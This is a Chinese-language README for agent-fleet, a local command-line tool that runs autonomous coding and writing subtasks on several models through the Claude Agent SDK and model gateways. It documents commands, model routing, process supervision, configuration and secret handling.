# agent-fleet — 通用多模型子任务执行工具

## 快速开始

```bash
ln -sf /Users/kcsx/Project/kcsx/macmini/yan-skills/agent-fleet/bin/fleet ~/.local/bin/fleet
fleet-go new fix --to gpt --auth local --write /path/to/project --goal "修复问题" --body task.md --dry-run
fleet team  # 五产品能力、顺位链与可用性；只显示存在性/登录状态
```

| 让谁做 | 适合什么 | 命令示例 | 派用者顺位参考 |
|---|---|---|---|
| `gpt` | 编码、调研、报告、只读复核；本机 Codex GPT-6.1 Sol | `fleet-go new fix --to gpt --auth local --goal "修复问题" --body task.md` | 网关 gpt-sol → Grok |
| `claude` | Claude 月度额度任务；默认 sonnet | `fleet-go new check --to claude --tier haiku --goal "复核报告" --body task.md` | code → 网关 gpt-sol → Grok → Gemini（仅文本） |
| `grok` | 视频与图片（生成、搜索）、X 平台（热点与实时讨论）、编码、检索调研、成人题材 | `fleet-go new trend --to grok --goal "整理 X 热点" --body task.md` | Claude 顺位下一档 Gemini（仅文本） |
| `gemini` | 文案、翻译、摘要、批量机械任务（`--bulk`） | `fleet-go new copy --to gemini --goal "写页面文案" --body task.md` | — |
| `jev` | 分类、选择、打分等结构化判断 | `fleet-go new decide --to jev --goal "按正文判据分类" --body task.md` | — |

`--to` 必填且仅接受上表五产品。`--review` 用于 GPT/Grok 只读复核，GPT `--low`；Claude `--tier haiku|sonnet|opus|fable`，默认 sonnet；Gemini `--bulk`；Grok `--model <id>` 与 `--subagents`。底层短命令仍保留，见 [Skill 命令速查](skill/SKILL.md#命令速查)。

`brief.md` 也可以直接写成任务文本；默认当前目录、不限轮数、安静模式。`--verbose` 显示进度。短命令和模型对应关系见 [skill](skill/SKILL.md)。

`fleet copy` 与 `fleet run --model kollab-gateway-copy` 自动原样前置 [文案语气规范](skill/references/copy-voice.md) 的 Paste-ready block；文件或块缺失会报错。brief 仍须提供事实清单、禁止项与输出格式。仅纯机械改写可用 `fleet copy brief.md --no-voice`（长命令同样支持）跳过语气块，其他通道保持不变。

## 失败上报与派用者顺位参考

失败上报给派用者：verdict 为 `fail`，结果文件和简报只记录执行者与档位、脱敏原始错误摘要（stderr 末尾、HTTP 状态、结构化错误）、已完成步骤、产物与 dirty 状态。fleet 不分类错误、不提供建议、不更换执行者。

下面的顺位表只供派用者自行判断，代码不消费：
- Claude 额度档：`claude → code → kollab-gateway-gpt-sol → grok → gemini`（Gemini 仅文本）。
- GPT 档：`code → kollab-gateway-gpt-sol → grok`；GPT 档含本机 Codex 与网关 gpt-sol 两跳。

派用者决定后，用 `fleet-go relaunch <name> --to <产品> [--tier haiku|sonnet|opus|fable]` 沿用同份 brief、`--name` 与 `--report` 重派。切换至网关 GPT 用底层 `fleet gpt brief.md --name <name> --report <report>`。Gemini 静态拒绝编码、UI 或带 `--expect-changes` 的任务；这是产品边界检查。成功任务不产生失败上报。

## xAI Grok Build CLI

```bash
fleet grok-cli brief.md --cwd /path/to/project --name demo-grok --report /tmp/demo-grok.md
fleet grok-cli brief.md --review --cwd /path/to/project
fleet-go new demo-grok --to grok --auth local --goal "完成编码任务" --body brief.md --dry-run
```

`grok-cli` 使用本机 xAI 完整编码 Agent；`fleet grok` 仍使用 Kollab 网关单轮模型。先 `grok login --oauth`，模型默认取 `grok models`，可用 `--model` 覆盖。runner 解析 streaming-json，保存 sessionId、stopReason、usage；简报 cost/turns 为 Grok 自报。非 end_turn（尤其工具批准被取消的 cancelled）判 fail，无明确最终结论判 suspect。写任务和 review 都自动批准；本机沙箱实测不生效，review 只读靠提示与事后快照，改动文件判 suspect。支持 `fleet say <任务> "新指令"` / `fleet-go amend --say` / `fleet resume <任务>` 以 sessionId 续跑。代理变量 HTTPS_PROXY/HTTP_PROXY/ALL_PROXY（含小写）原样透传，Rust Grok 不认 NODE_USE_ENV_PROXY。默认禁止子代理，详见 [Grok CLI](skill/references/grok-cli.md)。

## 默认独立运行：跨会话接续

```bash
fleet code brief.md --cwd /path/to/project --name demo --report /tmp/demo.md
fleet copy brief.md  # grok / bulk / gpt / run / run-many 同样默认独立运行
fleet code brief.md --no-wait  # 就绪后立即返回 runId 和文件路径
fleet code brief.md --attach  # 旧前台行为，随派发者进程组结束
fleet status --running --json
fleet wait demo  # 也支持完整 runId、唯一前缀、latest
fleet tail demo --follow
fleet stop latest
```

默认由独立监督进程运行，launcher 继续阻塞到终态，打印原简报并按 verdict 退出；`--json` / `--full` 仍输出原格式。`--detach` 是默认行为的兼容别名，立即返回需用 `--no-wait`。关闭终端、退出 Claude 或杀 launcher 整组不影响任务；启动失败明确报错，不退回前台。命令不需要 `&` / nohup / disown。

Claude Code 派单写法与误加 `&` 后的补救见 [Skill 顶部「派单前必读」](skill/SKILL.md)。默认等待 launcher 在 Claude 工具环境下检测到父进程变化时会告警，并在 status 标出 `⚠ detached-launch`（JSON 字段 `launchDetached: true`）；任务继续执行，不要杀掉重派。

新会话先 `fleet status --running`，对已有任务逐个 `fleet wait <id>` 接着等，不要重派。`status` 默认跨 cwd 列出全部非终态及最近24小时终态，`--running` 只列 running/abnormal，`--json` 返回数组；每行包含 runId、短名、模型、状态、时长、cwd、报告路径及最后心跳。`--name`、`--report` 可指定元数据，未传时从 brief 的“归类…”行及 `REPORT:` 行提取。

状态保存在 `~/.agent-fleet/runs/<runId>.json`，原子更新监督/执行 PID、每30秒心跳、结果/日志路径及简报。PID死亡或心跳超过90秒判为 abnormal；若最后心跳早于启动+10分钟，提示可能重启/强制休眠中断及 `fleet resume <id>`。`wait` 每两秒只读状态与 PID，终态立即返回简报；超时只结束等待，任务继续。`wait` / `tail` 支持短名、唯一runId前缀，`latest` 指当前目录最近任务（包括终态）；stop/say/resume 的 latest 保持当前目录最近存活任务规则。

网关与 Grok 任务支持 say/resume；Codex 默认用独立 stdio app-server 支持同轮 `turn/steer`，失败尝试 SIGINT 后 `codex exec resume`；启动/握手失败退回原 exec，没有可续跑会话时明确提示 `--restart`。`fleet-go amend --say` 同样生效，异常中断可用 threadId/sessionId `fleet resume`，沿用 cwd、low/review、name/report；简报记录 steer/resume 次数与降级。只读沙箱无法等价时保持 read-only exec。steer 接受不等于立即执行，也不能撤销已完成写入，详见 [中途插话](skill/references/codex-coding.md#中途插话)。macOS 沿用系统 caffeinate 防空闲睡眠；机器重启、合盖强制休眠仍会中断或暂停，不提供重启恢复。监督器被 SIGKILL 时标 abnormal，可用完整runId stop 清理存活执行器。

## Kollab 文字模型与多模态

认证优先用 `KOLLAB_API_KEY` 或 `KOLLAB_STANDALONE_API_KEY`（可用 `kollab api-key create` 创建），其次用进程级 `KOLLAB_API_TOKEN` 或已有 `kollab login` 会话。连接 TEST 必须显式设置 `KOLLAB_API_URL`，不要复用生产 profile。密钥只通过环境变量传给本机 `kollab`，无需厂商 key。

文字 Agent 可继续用现有 `kollab-gateway*` 配置走 Kollab `/api/llm`；按当前配置对应的环境变量提供 standalone key，即可用 `fleet run --model kollab-gateway --prompt "任务"`。查询全部文字模型用 `fleet media models`（或 `--source openrouter --search 关键词`），一次性文字调用用 `kollab model run --model <目录中的 id> --prompt "任务"`。

```bash
fleet media list
fleet media models --source openrouter --search vision
fleet media run generate_image --model <fleet media list 中的 id> --prompt "一只猫" --out ./fleet-media
fleet media run edit_image --model <id> --prompt "修改背景" --input-json '{"image_refs":[{"artifact_id":"<id>"}]}'
kollab model run --model google/gemini-3.1-flash-image --prompt "一只猫" --output-dir ./fleet-media
```

`fleet media list` 从 `kollab tool list` 按 image、video、audio、vision 打印当前可用 tool、模型 id 和必填字段；能力清单以实时输出为准。已在 TEST 验证的例子包括 Nano Banana 三款、Grok Image、gpt-image-2，Seedance 2/2.5、Veo 3、Kling、Hailuo 3、Grok 视频，Tripo 3D 和 Grok TTS/STT；具体用法及暂未开放项见 [多模态用法](skill/references/media.md)。`fleet media run` 合并 `--model`、`--prompt` 与 `--input-json`，调用 `kollab tool run`；默认输出到当前目录的 `fleet-media/`。终端只列文件路径和状态/费用摘要，无媒体文件的结果写入 `result.json`。图片规范入口是 `fleet media run generate_image`；普通配图也可直接用 imagegen。

给它一个任务描述 + 一个模型,它就用 [Claude Agent SDK](https://github.com/anthropics/claude-agent-sdk-typescript)
驱动一个完整的自主 Agent(能读写文件、跑 bash、多轮工具调用直到任务完成)去执行,权限模式固定
`bypassPermissions`(不需要人工逐步确认每一步),跑完把结果返回。

**核心场景**:你想同时跑好几个任务,每个任务用不同的模型——比如同时起一个用 Gemini 写文案的任务、
一个用 DeepSeek 做调研头脑风暴的任务,两个并行跑,互不干扰,跑完各自把结果交回来。

**本地编排,模型来源你自己选**:Agent 的读写文件、跑命令、多轮工具调用全部在这台机器上进行,不
经过任何托管的编排基础设施。模型请求接的是**你自己的** API key——可以是 DeepSeek、Moonshot/Kimi
官方端点,可以是你自己搭的任何 Anthropic 兼容端点,也可以是 `kollab-gateway`:Kollab 自己的公开
LLM 网关(`POST /api/llm`),用你账号自助生成、随时可吊销的 `kollab_live_*` standalone key 鉴权,
费用从对应 Space 的额度里扣,不需要再单独去 DeepSeek/Moonshot 官网申请 key 就能先跑起来。

## 它是怎么做到"一个工具接多个模型"的

Claude Agent SDK 本质上是"驱动 Claude Code CLI"的 SDK,但 Claude Code CLI 支持把请求整体重定向到
任何**声称自己兼容 Anthropic Messages 协议**的端点(通过 `ANTHROPIC_BASE_URL` + 鉴权环境变量)。
DeepSeek 和 Moonshot(Kimi)都做了这样一层官方兼容端点,所以可以直接用 Claude Agent SDK 的自主
Agent 能力去驱动它们的模型——你拿到的不是"一问一答",而是一个会自己读文件、写代码、跑命令、
多轮纠错直到任务完成的完整 Agent,只是底层模型换成了 DeepSeek/Kimi。

## 支持哪些模型(如实说明,没有编造任何端点)

配置全部在 [`models.config.json`](./models.config.json) 里,已经预填好经过查证的真实官方接入参数:

| 友好名字 | 上游 | 官方接入方式 | 说明 |
|---|---|---|---|
| `deepseek-v4-pro` | DeepSeek | `https://api.deepseek.com/anthropic`,`x-api-key` 鉴权 | 官方 Anthropic 兼容端点,Opus 档位映射目标,适合最高质量单次产出 |
| `deepseek-v4.1-flash` | DeepSeek | 同上,`model: "deepseek-flash"` | 同一端点的 V4.1 Flash 稳定别名,快、便宜,适合调研/头脑风暴/大批量任务 |
| `kimi` | Moonshot(Kimi) | `https://api.moonshot.cn/anthropic`,`Authorization: Bearer` 鉴权 | 官方 Anthropic 兼容端点(中国站)。国际站把 `baseURL` 换成 `https://api.moonshot.ai/anthropic` 即可,鉴权方式不变 |
| `gemini` | Google | **没有官方端点** | 见下方说明,需要你自备网关 |
| `kollab-gateway` | Kollab 自己的公开 LLM 网关 | `https://kollab.im/api/llm`(生产环境),`x-api-key` 鉴权，使用已有 `KOLLAB_PROD_API_KEY` | 不需要申请任何第三方官方 key,模型范围不限白名单。默认模型是 `gemini-3.8-flash`(**故意不用** `claude-sonnet-4-6`——那样账单虽然走 Kollab 自己的 Space 额度,但底层实际还在消耗 Claude,没有分担成本的效果);已做过真实端到端验证,见下方「验证情况」。费用从这把 key 绑定的 Kollab Space 额度实时扣除,当前配置已使用生产环境 |
| `kollab-gateway-copy` | 同上 | 同上,`model: "gemini-3.8-flash"` | 文案/创意用途的命名别名,和默认模型相同,单独命名是为了不依赖默认值以后的调整 |
| `kollab-gateway-research` | 同上 | 同上,`model: "grok-4.7"` | 通用调研摘要用途 |
| `kollab-gateway-bulk` | 同上 | 同上,`model: "gemini-3.5-flash-lite"` | 批量翻译/格式转换等机械任务用途,目录里响应最快的免费档模型之一 |
| `kollab-gateway-gpt-sol` | Kollab | 线上托管网关，`model: "gpt-6-sol"` | GPT-6 Sol |
| `kollab-gateway-deepseek` | Kollab | 同上，`model: "deepseek-v4.1-flash"` | DeepSeek V4.1 Flash；无需第三方 Key |
| `jev` | Typesafe(JEV / System One) | `https://api.typesafe.ai/v1/systemone`,`Authorization: Bearer` 鉴权(`protocol: "typesafe-systemone"`,**不是** Anthropic Messages/OpenAI 协议) | ⚠️ **不支持 `run`/`run-many`**——它是结构化决策 API,不生成文本、不支持多轮工具调用,只能用下面「JEV / `judge` 子命令」一节的方式调用 |

**关于 Gemini 的如实说明**:查证下来,Google 官方**没有**为 Gemini 提供 Anthropic Messages 协议
兼容端点(不像 DeepSeek/Moonshot 那样)。市面上能找到的都是社区维护的转换代理(比如把 Anthropic
格式转成 Gemini 原生格式或 OpenAI 兼容格式再转发)。所以 `models.config.json` 里 `gemini` 这一项的
`baseURL`/`model` 是**空的**——在你自己搭一个这样的网关(比如自建 [LiteLLM](https://docs.litellm.ai/)
proxy,或任何等价方案)并把地址填进去之前,选这个模型会直接报错退出,**不会**假装有个官方地址静默
发过去。

模型 ID 会随官方迭代变化,建议定期核对:
- DeepSeek: <https://api-docs.deepseek.com/guides/anthropic_api>
- Kimi: <https://platform.kimi.com/docs/api/list-models>

## JEV / `judge` 子命令(结构化决策,不是对话模型)

[Typesafe 的 JEV / System One](https://docs.typesafe.ai/) 是一个和上面所有条目都不同类的东西:它不
生成回复、不写代码、不做多轮对话,官方原话:"System One models do not write replies, produce code,
or generate explanations of their reasoning." 每次调用给它一段 `state`(文本或结构化 JSON)+ 若干
类型化 `questions`(`noul` = 是否概率、`choice` = 多选一 + 置信度、`score` = 打分 + 置信度),它返回
校准过的结构化答案,你的代码可以直接拿去用,不用再让一个通用 LLM"返回 JSON 但经常返回不合法 JSON"。

**为什么不是 `run --model jev`**:`run`/`run-many` 靠 Claude Agent SDK 的 `query()` 驱动上游,而
`query()` 只认 Anthropic Messages 协议(`POST {baseURL}/messages`,messages 数组、流式、tool_use)。
2026-09-25 真实测过 `POST https://api.typesafe.ai/v1/messages` 返回 **404**,证实 JEV 完全没实现
这个协议——不是"加个适配器就能补"的问题,是协议层面根本不兼容。所以 agent-fleet 给
`protocol: "typesafe-systemone"` 的模型加了一道闸门:`run --model jev` 会在发请求前直接报错拒绝,
不会静默发出一个必然失败的请求。JEV 走独立的 `judge` 子命令,直连它自己的协议(`src/judge-task.mjs`),
不经过 Claude Agent SDK。

```bash
# state.txt:要评估的内容(纯文本,或 .json 结尾按 JSON 解析成结构化 state)
# questions.json:{ 问题key: { type: "noul"|"choice"|"score", instructions, criteria? } }
node bin/agent-fleet.mjs judge --model jev --state-file state.txt --questions-file questions.json --json
```

**JEV 适合做什么 / 不适合做什么(2026-09-25 用 26 次真实调用 + 只读调研 4 个第三方 skill 得出,
证据见 `/tmp` 的 `jev-capabilities.md` 能力摸底报告,以及下面「JEV 验证记录」)**:

| 任务类型 | 结论 | 依据 |
|---|---|---|
| 预定义分类/路由/打分/二元判断 | **适合,是它的设计目标** | 真实调用:工单文本 → 路由(billing/technical/account)+ 紧急度打分 + 是否退款请求,一次调用三问全对,`confidence` 均 ≥0.87 |
| 多步骤 Agent 循环里的"下一步选哪个"决策节点 | **适合**,复刻了 wy-coliney/jev-browser-use(528 安装)的真实用法 | 喂一段 accessibility-tree 文本 + 候选动作(click_2/click_7/…/DONE/BLOCKED)做 `choice`,正确选出"先填邮箱框",置信度 0.92;该第三方 skill 的真实做法就是每步一次 `choice` 调用,state 用 AX 树文本而非截图 |
| 批量文件改动前的"要不要自动应用"闸门 | **适合(它做判断,不做编辑)** | 给 3 个候选 diff 做 `choice`,正确挑出无行为变更的安全项,正确排除有逻辑改动的选项 |
| 爬取网页后按预定义维度分类/打分 | **适合(分类/打分),不适合生成摘要文字** | 抓取一页 Wikipedia 纯文本作 state,`choice` 判断主题 + `score` 判断专业程度,均正确;但它不会输出一段自然语言摘要——那部分仍要另一个生成式模型 |
| 代码生成、开放式写作 | **不适合,结构性不支持** | 故意用 `noul` 让它"写一首俳句",只回了个 0-1 概率而非文字;用编造的 `"type":"generate"` 直接被协议拒绝(`HTTP 400`)——协议里根本没有自由生成这个问题类型 |
| 多轮工具调用(bash + 读写文件) | **不适合,结构性不支持** | 单次同步调用,无 messages/tool_use/会话状态;`/v1/messages` 404 证实无法接入 SDK 的多轮循环 |
| 图片理解 | **不支持** | 真实塞一张 1x1 PNG base64 进去,`noul` 只回 0.01(答非所问),与文档"no image input"一致 |
| 浏览器操作本身(点击/输入) | **JEV 不操作浏览器**,只能当决策层 | 见上面"下一步选哪个"一行;真正的点击/输入由宿主 LLM 或固定代码执行,JEV 只挑候选 |

**已知坑(来自第三方调研,非 agent-fleet 自己踩过,但值得留意)**:JEV 按字面判断、不推断意图
(okooo5km/jev 曾把广告误判为"含可行动信息");`noul` 的 0.5 代表"不确定"而不是"中等"
(dbreunig/building-with-jev-skill);不要用它承担超出"单点判断"的复合任务——kerpopule/hermes-jev-skills
真实测过用 JEV 做会话摘要,召回率反而低于什么都不做的朴素截断方案。

### 任务类型 → 推荐模型(agent-fleet 自己调研 + 真实验证后得出,会持续校准)

编程与 review 优先规则见 [Codex 编程与 review](skill/references/codex-coding.md)。本机 Codex 可用时优先 GPT-6.1 Sol；其他任务沿用下表已有的模型分工。模型目录和账号能力可能变化，始终以真实调用和任务验收为准。

| 任务类型 | 推荐模型 / 友好名字 | 理由 |
|---|---|---|
| 写代码 / 修 bug / 补测试 | 本机 Codex CLI 的 `gpt-6.1-sol`，默认 `medium`，简单任务 `low` | 主力编码通道；失败上报派用者自行判断重派 |
| 写作 / 翻译 / 调研 / 母语校对（写文档、写报告、核实资料） | `kollab-gateway-copy`(`gemini-3.8-flash`)或 `kollab-gateway`(默认同款) | 响应迅速、成本低，即用免第三方审批。长报告换 `gemini-3.1-pro`。**注意：实测 `gemini-3.8-flash` 做多文件代码改动容易跑满轮数零产出，绝对不要派它写代码** |
| 批量翻译 / 格式转换 | `deepseek-v4.1-flash`(需配 `DEEPSEEK_API_KEY`)或 `kollab-gateway-bulk`(`gemini-3.5-flash-lite`,即用免配置) | 官方 Flash 档更便宜;没有 DeepSeek key 时 `kollab-gateway-bulk` 是免第三方审批的平替 |
| 简单调研摘要 | `kimi`(需配 `MOONSHOT_API_KEY`,自带联网搜索)或 `kollab-gateway-research`(`grok-4.7`,即用免配置) | Kimi 官方端点自带联网检索能力,适合真正需要查资料的调研;不想等 key 审批时用 `kollab-gateway-research` 顶上 |
| 高质量单次产出(长文案定稿、复杂推理) | `deepseek-v4-pro`(需配 `DEEPSEEK_API_KEY`) | DeepSeek 官方 Opus 档位映射目标,适合一次成型、不想反复返工的任务 |
| 自动化流程里的判断/路由节点(分类、打分、二元判断、"下一步选哪个候选") | `jev`(**走 `judge` 子命令,不是 `run`**) | 结构化决策 API,不生成文本、极便宜(≈$0.042/百万 input token,output 免费)、同一输入多次调用高度稳定,没有裸 tool-call 控制 token 这类失败模式(协议本身不返回自由文本)。详见上面「JEV / `judge` 子命令」一节的实测结论表 |
| Kimi/DeepSeek/Qwen 家族、多轮工具调用容错要求高的任务 | 不建议派给这几个家族的第三方模型,改派 `fleet code`(Codex GPT-6.1 Sol);失败时按全局规则停下告知用户,不静默转给 Claude | 这几个家族的模型已知存在 tool-calling 可靠性问题,有时会把裸的 tool-call 控制 token 当成普通文本吐出来而不是走结构化 `tool_use`,造成"进程正常退出但其实是假成功"——这是模型生成层面的问题,agent-fleet 的 harness 补不了,只能靠不把这类任务派给它们来规避。任何第三方模型只要某次实际输出里出现裸 tool-call 控制 token,那一次就要判定失败——不能因为路由到它就放松这条判定标准 |

**关于 Qwen**:调研建议里提过可以考虑 Qwen,但截至本次核对(2026-09,TEST 环境
`kollab model list`),Kollab 网关目录里**没有**收录任何 Qwen 系列模型 id,所以上面没有把 Qwen
列进 `kollab-gateway-*` 条目;如果之后网关目录新增了 Qwen,再重新跑一遍 `kollab model list`
确认 `paidOnly` 状态后补充。

**关于裸 tool-call 控制 token**:通过 `kollab-gateway` 系列条目调用第三方模型时,如果返回结果里
出现类似 `<minimax:tool_call>`、`<|tool_calls_section_begin|>` 这类未被正确解析成 `tool_use`
的痕迹,应视为这次调用失败,不能因为 CLI 进程正常退出、`isError: false` 就当成功——这是已知的
模型生成层面缺陷,不是 agent-fleet 的 bug。

## 安装

```bash
cd agent-fleet
npm install
```

**维护约定**：改 CLI 或 SDK 接入时先用 `npm run check-sdk` 检查当前版本；有明确兼容需求才升级依赖，并运行 `npm test` 与相关真实调用。纯文档修改无需升级 SDK 或消耗网关额度。

## 配置

1. 复制密钥模板:
   ```bash
   cp .env.example .env
   ```
2. 打开 `.env`,填入你自己的真实 key(去哪个网站生成见 `.env.example` 里的注释)。
   `.env` 已经被仓库根目录的 `.gitignore` 排除,不会被提交。
3. 如果要加/改/删可用的模型,直接改 `models.config.json`——这个文件本身**不含任何密钥**,
   `apiKeyEnv` 字段只是"去读哪个环境变量",真实值永远只在 `.env` 里。
4. 用 `list-models` 检查配置和密钥状态(只显示 present/missing,绝不打印密钥本身):
   ```bash
   node bin/agent-fleet.mjs list-models
   ```

## 用法

### `run` — 跑单个任务

```bash
agent-fleet run --model <友好名字> --prompt "<任务描述>" [--cwd <目录>] [--json]
```

示例:

```bash
# 用 DeepSeek Flash 做一次调研/头脑风暴
node bin/agent-fleet.mjs run \
  --model deepseek-v4.1-flash \
  --prompt "帮我调研一下 XX 竞品有哪些定价策略,写一份简短总结"

# 用 Kimi 在指定项目目录里干活,输出结构化 JSON 方便脚本解析
node bin/agent-fleet.mjs run \
  --model kimi \
  --prompt "把这个目录下的 README 翻译成英文,直接改文件" \
  --cwd ~/some-project \
  --json
```

想同时跑多个不同模型的任务,最简单的办法就是开多个终端(或用 `&` 丢后台)各自 `run` 一次——Claude
Agent SDK 的设计就是"一个调用绑一个模型的独立进程",天然支持这样并发,不需要在单进程里做复杂的
多模型切换。运行中可以用 `status` / `say` / `stop` 插话或收尾,见下方「运行中插话」。

### `run-many` — 一次命令批量并发跑一批任务

```bash
agent-fleet run-many --config batch.json [--json]
```

`batch.json` 是一个数组,每一项 `{ model, prompt, cwd? }`:

```json
[
  { "model": "gemini", "prompt": "写一段产品介绍文案" },
  { "model": "deepseek-v4.1-flash", "prompt": "调研一下同类产品的定价策略" }
]
```

内部用 `Promise.allSettled` 真正并发执行,每个任务独立成败——一个任务失败不会影响其它任务,最后
把每个任务各自的结果按原始顺序一起返回。某个任务被外部信号杀掉时,简报会写明是哪一个。

### 运行中插话 / 停止 / 续跑

`run` / `run-many` 启动时会写 `~/.agent-fleet/runs/<run-id>.pid.json`(pid、模型、cwd、日志路径;
SDK 给出 `session_id` 后补写)。正常结束标记 `finished`。收件箱是同目录下的 `<run-id>.inbox`(JSONL)。

```bash
agent-fleet status
agent-fleet say latest "改变计划:写到 step5 就停"
agent-fleet stop latest --grace 20
agent-fleet resume <run-id> "接着把剩下的做完"
```

- `status`:列出 pid 仍存活的任务。pid 已不在但未标 finished →「异常终止（可能被外部信号杀掉）」。
- `say`:把消息追加进收件箱；网关 query 使用 streaming input，Codex 优先同轮 steer，Grok 与 Codex 兜底中断当前轮后续会话。
- `stop`:先投递「请立即收尾」;宽限期后 `query.interrupt()`,仍在则对该 pid 发 SIGTERM,再 5 秒 SIGKILL。发信号前校验 pid 来自该 run 的 pid.json,且 `ps` command 含 `agent-fleet` 并与记录一致。只杀这棵 pid 树,绝不 `pkill`/`killall`。结果文件和简报仍会写出,`verdict=stopped`。
- `resume`:用记录中的 threadId/sessionId 续跑，生成新 run-id，简报带 `resumedFrom`；Codex 仍运行时用 say，避免重复执行。

默认执行者提示里写明:绝不 `kill` / `pkill` / `killall` 任何不是你自己启动的进程。进程收到并非来自本工具 `stop` 的 SIGTERM/SIGINT 时,结果文件注明「被外部信号 X 终止」。

### 常用选项

- `--max-turns <n>`:限制最大工具调用轮数;默认不设上限(`bin/agent-fleet.mjs` 与 `src/run-task.mjs` 只在显式传入时才把 `maxTurns` 交给 SDK)
- `--verbose`:恢复 stderr 实时进度；默认安静写日志
- `--system-prompt <text>`:追加系统提示。会接在下面「默认执行者系统提示」之后,两者都保留,
  不是二选一(见「子 agent 模型映射」一节下方的说明)
- `--models-config <path>`:临时换一份配置文件(默认用包目录下的 `models.config.json`)
- `--json`:stdout 只输出一个合法 JSON(对象或数组),进度一律走 stderr。默认是简报(`ok`、`verdict`、耗时、费用、轮数、预览前 N 行、结果文件路径、日志路径、新提交 hash、是否 dirty、是否含裸控制 token);加 `--full` 恢复旧版完整 `result`
- `--full`:把完整最终回复打到 stdout;默认全文写进 `~/.agent-fleet/runs/<run-id>.result.md`
- `--brief-lines <n>`:简报预览行数,默认 3
- `--expect-changes`:声明任务需要改文件;运行期间零提交、零改动时 `verdict=suspect`
- `--judge`:进程内调 JEV,问「最终回复是否满足任务要求」;置信度 < 0.55 → `needs-review`;无 `TYPESAFE_API_KEY` 则跳过并在简报注明

`models.config.json` 的可选字段 `maxOutputTokens` 必须是正整数，限制该模型每次请求的最大输出 token 数；fleet 将它传为 `CLAUDE_CODE_MAX_OUTPUT_TOKENS`，未配置则沿用默认值。Kollab 网关条目统一设为 16000。
Kollab 网关 402 会话预算：本小时预算按首次请求时的余额定死，充值后要到下一个整点（UTC）才放开；期间用 `maxOutputTokens` 限制即可通过（仍须有足够预算）。

### 自定义请求头(只有自备网关才会用到)

有些第三方网关/企业代理除了 API Key 还要求带一个额外的认证头。这种头的值本身就是凭据,所以规则和
API Key 完全一致:`models.config.json` 里只写**指针**,真实值只放 `.env`。

```jsonc
"my-gateway": {
  "baseURL": "https://gateway.example.com/anthropic",
  "model": "whatever-your-gateway-calls-it",
  "apiKeyEnv": "MY_GATEWAY_API_KEY",
  "headerEnvs": { "X-Gateway-Auth": "MY_GATEWAY_HEADER_TOKEN" }  // 值是变量名,不是真实值
}
```

强制约束(加载配置时就会校验,不合规直接报错退出):

- 不允许写字面量 `headers`——那个文件会进 git。
- `headerEnvs` 的值必须是环境变量名;头值里带换行符会被拒绝(防请求头注入)。
- 不允许自定义 `x-api-key` / `Authorization` 等由 `authHeader` 负责的头。
- `list-models` 只显示头名和 present/missing,**从不打印头值**。

### 子 agent 模型映射(0.4.0 起,修复 2026-09-26 的 unrecognized_model 崩溃;0.5.0 起默认 stdout 只给简报)

**问题**:被 agent-fleet 驱动的第三方模型自己也会用 Claude Code 的 Agent/Task 工具派子 agent。
这个工具默认让子 agent"继承主循环的 model 字符串"——当主循环 model 是网关自己的模型 ID(比如
`gemini-3.8-flash`)而不是 Claude 官方模型名时,子 agent 一旦被(前台同步)调用,Claude Code
本地的模型名校验会判定这个字符串"unrecognized",触发
`[claude-code:unrecognized_model] {"model":"gemini-3.8-flash","query_source":"sdk"}`,
严重时整个进程被 SIGKILL、父任务一起失败(2026-09-26 用 kollab-gateway-copy 真实复现过,
`~/.agent-fleet/runs/2026-09-26T01-50-12-213Z-kollab-gateway-copy.log`)。实测下来触发条件不算
稳定必现(同一个模型换一次 prompt/任务节奏就可能不触发),但只要出现就是整个任务失败,值得
从根上堵掉。

**根因定位**:用 `strings` 反汇编已安装的 SDK 原生二进制
(`node_modules/@anthropic-ai/claude-agent-sdk-darwin-arm64/claude`)确认,`unrecognized_model`
是 Claude Code **本地**的模型名校验产生的(函数 `oZ()`,标签 `query_source`),不是网关或
Anthropic 服务端返回的错误——本地维护一份"识别出来的模型形状"分类,网关自己的模型 ID 天然不
在这个分类里。同一份二进制里核实到 Claude Code 官方就支持给子 agent 单独配一个模型:

- `CLAUDE_CODE_SUBAGENT_MODEL`:子 agent 默认应该用哪个模型(可以是 `sonnet`/`opus`/`haiku`/
  `fable` 这类档位别名,也可以是完整模型 ID,或 `inherit` 继承主循环——不设就是 `inherit`,
  即修复前的行为)。SDK 的 `AgentDefinition.model` 字段文档("if omitted, uses the default
  subagent model when one is configured, else the main model")说的就是这个变量。
- `ANTHROPIC_DEFAULT_SONNET_MODEL`(以及 `_OPUS_MODEL`/`_HAIKU_MODEL`/`_FABLE_MODEL`):把
  `sonnet`/`opus`/`haiku`/`fable` 这几个档位别名解析到的真实模型 ID 重新指向别处——这是
  Claude Code 给第三方模型提供商准备的官方机制,不是绕过校验的手法。

**落地方式**:`models.config.json` 里每个模型条目可以加一个可选字段 `subagentModel`(子
agent 实际应该发给同一个 baseURL/apiKey 的模型 ID,可以和主模型相同,也可以是同网关下更便宜/
更可靠的模型)。配了这个字段后,`src/isolated-env.mjs` 会在子进程环境和 flag 层 settings 里
同时设置:

```
CLAUDE_CODE_SUBAGENT_MODEL=sonnet
ANTHROPIC_DEFAULT_SONNET_MODEL=<subagentModel 的值>
```

固定用 `sonnet` 这个别名(不是按任务档位选 haiku/opus/fable)是因为这里的"档位"在网关侧没有
实际含义——一个 `models.config.json` 条目本来就只对应一个具体第三方模型。这样 Claude Code
本地看到的是一个自己认识的档位别名(不会触发 unrecognized_model),而真正发给网关的请求体里
`model` 字段是 `subagentModel` 配置的那个网关模型 ID。当前 `kollab-gateway*` 系列的
`subagentModel` 统一指向 `deepseek-v4.1-flash`；这是当前配置已有的同网关模型 ID。该映射的本地桩验证与真实网关验证应分别记录，不能把历史其他模型的调用当成新映射验收。没配 `subagentModel` 的模型条目行为不变(子 agent 原样继承
主 model 字符串)。

这两个变量同样受「目标工作目录不能改动本次运行的任何环境变量」那条闸门保护(见下面「安全边界」
一节)——`--cwd` 目录没有办法通过自己的 `.claude/settings.json` 把子 agent 的模型改到别处去。

**默认执行者系统提示**:每次 `run`/`run-many` 都会用 SDK 的
`systemPrompt: { type: 'preset', preset: 'claude_code', append: '...' }` 写法追加一段默认提示
(见 `src/run-task.mjs` 的 `DEFAULT_EXECUTOR_SYSTEM_PROMPT`):你是执行者,要直接动手完成任务、
不能只转发或转述;禁止用 Bash 反过来调用 agent-fleet 自己(会造成递归嵌套);禁止调用 Agent/Task 工具或转派任务；不允许杀死不是自己启动的进程。用 `preset+append` 而不是替换,
是为了保留 Claude Code 自带的默认系统提示(工具定义等)——`--system-prompt` 传入的文本接在这段
默认提示之后,两者都保留,不是二选一。

## 验证情况(如实说明)

